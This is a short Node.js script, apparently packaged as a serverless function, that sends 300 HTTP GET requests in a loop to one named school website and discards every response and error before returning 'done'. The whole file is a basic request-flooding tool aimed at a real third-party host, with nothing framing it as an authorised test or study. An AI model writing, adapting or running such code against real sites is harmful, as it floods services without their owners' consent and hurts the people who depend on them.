const http = require('http');

const target = {
    hostname: 'www.buonarroti.tn.it',
    port: 80,
    path: '/',
    method: 'GET'
}

const numRequests = 300;

for (let i = 0; i < numRequests; i++) {
    const req = http.request(target);

    req.on('response', (response) => {});
    req.on('error', (error) => {});

    req.end();
}

exports.handler = async (event, context) => {
    return {
        statusCode: 200,
        body: 'done',
    }
}